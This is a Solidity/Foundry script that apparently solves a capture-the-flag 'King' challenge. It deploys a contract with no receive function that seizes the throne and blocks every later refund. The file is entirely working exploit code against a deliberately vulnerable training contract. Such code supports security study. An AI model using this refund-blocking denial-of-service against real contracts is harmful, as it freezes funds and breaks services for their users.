// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract theLastKing {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0x55D38a4ee4a3c804481a9d0F7B259EdF56c3Def8));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new theLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}